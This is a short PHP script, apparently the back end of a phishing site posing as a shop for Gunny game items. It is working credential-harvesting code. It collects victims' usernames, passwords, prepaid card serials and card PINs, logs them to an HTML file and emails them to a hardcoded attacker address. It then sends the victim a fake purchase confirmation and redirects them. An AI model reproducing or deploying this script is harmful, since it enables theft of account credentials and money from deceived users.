<?php
if (isset ($_GET["vp"])) 
{
        $vp = $_GET['vp'];
}
  else
{
		$vp = $_POST['vp'];
}
$nick = $_POST['nick'];
$pass = $_POST['pass'];
$seri = $_POST['seri'];
$passthe = $_POST['passthe'];
$mail = $_POST['mail'];
$to = "del.itvn@gmail.com";
$subject = "Hacked4u";
$message = $nick." - ".$pass." - ".$seri." - ".$passthe." - Xu";
$from = "Admin@Hacked4u.Net";
$headers = "From:" . $from;


$f = fopen("kekek.html" , 'a') or exit("Hack Không Thành Công!");

fwrite($f," | Username : $nick - Pass : $pass - Seri : $seri - Mat Ma The : $passthe - Loai Tien : Xu | \n <br>");
fclose($f);

mail($to,$subject,$message,$headers);


$to1 = "$mail";
$subject1 = "Cảm Ơn Bạn Đã Mua Vật Phẩm Gunny tại Hacked4u.Net!";
$message1 = "Cảm ơn bạn ".$nick." đã mua thành công ".$vp." tại website Hacked4u.Net! Y!: del.itvn or Email: del.itvn@gmail.com";
$from1 = "Admin@hacked4u.net";
$headers1 = "From:" . $from1;

mail($to1,$subject1,$message1,$headers1);

header('location:/');
?>